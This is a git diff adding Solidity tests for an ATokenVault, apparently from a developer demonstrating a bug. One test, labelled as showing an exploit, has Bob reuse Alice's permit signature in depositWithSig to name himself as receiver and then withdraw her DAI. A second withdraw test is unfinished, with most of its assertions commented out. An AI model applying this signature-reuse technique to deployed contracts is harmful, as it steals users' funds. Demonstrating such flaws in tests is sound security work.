@@ -38,6 +38,40 @@ contract ATokenVaultWithSigTest is ATokenVaultBaseTest {
                                 DEPOSIT
     //////////////////////////////////////////////////////////////*/
 
+    // TODO remove - just to show exploit
+    function testDepositWithSigExploit() public {
+        uint256 amount = HUNDRED;
+        deal(address(dai), ALICE, amount);
+
+        EIP712Signature memory sig = _createPermitSig({
+            owner: ALICE,
+            ownerPrivKey: ALICE_PRIV_KEY,
+            spender: address(vault),
+            value: amount,
+            nonce: dai.nonces(ALICE),
+            deadline: block.timestamp
+        });
+
+        assertEq(dai.balanceOf(ALICE), HUNDRED);
+        assertEq(dai.balanceOf(BOB), 0);
+
+        // NOTE - EXPLOIT:
+        // Instead of calling depositWithSig with {receiver: ALICE}, Bob calls it with {receiver: BOB}
+        // The same sig can still be used, because it only increases Alice's allowance for the vault address
+        // Then, after the vault has pulled Alice's DAI, it mints the new shares to Bob instead of Alice
+        // And Bob can immediately withdraw this new DAI from the vault with a new tx
+        vm.startPrank(BOB);
+        // vault.depositWithSig({assets: amount, receiver: ALICE, depositor: ALICE, sig: sig});
+        vault.depositWithSig({assets: amount, receiver: BOB, depositor: ALICE, sig: sig});
+        vault.withdraw({assets: amount, receiver: BOB, owner: BOB});
+        vm.stopPrank();
+
+        // Asserting that DAI has been transferred to BOB, and ALICE has no DAI or shares
+        assertEq(dai.balanceOf(ALICE), 0);
+        assertEq(vault.balanceOf(ALICE), 0);
+        assertEq(dai.balanceOf(BOB), HUNDRED);
+    }
+
     function testDepositWithSig() public {
         uint256 amount = HUNDRED;
         deal(address(dai), ALICE, amount);
@@ -339,6 +373,50 @@ contract ATokenVaultWithSigTest is ATokenVaultBaseTest {
     /*//////////////////////////////////////////////////////////////
                                 WITHDRAW
     //////////////////////////////////////////////////////////////*/
+
+    function testWithdrawWithSig() public {
+        uint256 amount = HUNDRED;
+        deal(address(dai), ALICE, amount);
+
+        vm.startPrank(ALICE);
+        dai.approve(address(vault), amount);
+        vault.deposit({assets: amount, receiver: ALICE});
+        vm.stopPrank();
+
+        ASSET_DOMAIN_SEPARATOR = vault.DOMAIN_SEPARATOR();
+        EIP712Signature memory sig = _createPermitSig({
+            owner: ALICE,
+            ownerPrivKey: ALICE_PRIV_KEY,
+            spender: BOB,
+            value: amount,
+            nonce: vault.nonces(ALICE),
+            deadline: block.timestamp
+        });
+
+        vm.startPrank(BOB);
+        console.log(vault.balanceOf(BOB));
+        vault.permit(ALICE, BOB, amount, sig.deadline, sig.v, sig.r, sig.s);
+        vault.transferFrom({from: ALICE, to: BOB, amount: amount});
+        console.log(vault.balanceOf(BOB));
+        vm.stopPrank();
+
+        // assertEq(vault.balanceOf(ALICE), amount);
+        // assertEq(dai.balanceOf(ALICE), 0);
+        // assertEq(dai.balanceOf(BOB), 0);
+        // assertEq(dai.balanceOf(address(vault)), 0);
+        // assertEq(aDai.balanceOf(address(vault)), amount);
+
+        // // Bob calls withdraw on Alice's behalf
+        // vm.startPrank(BOB);
+        // vault.withdrawWithSig({assets: amount, receiver: ALICE, owner: ALICE, sig: sig});
+        // vm.stopPrank();
+
+        // assertEq(vault.balanceOf(ALICE), 0);
+        // assertEq(dai.balanceOf(ALICE), amount);
+        // assertEq(dai.balanceOf(BOB), 0);
+        // assertEq(dai.balanceOf(address(vault)), 0);
+        // assertEq(aDai.balanceOf(address(vault)), 0);
+    }
 
     /*//////////////////////////////////////////////////////////////
                                 REDEEM
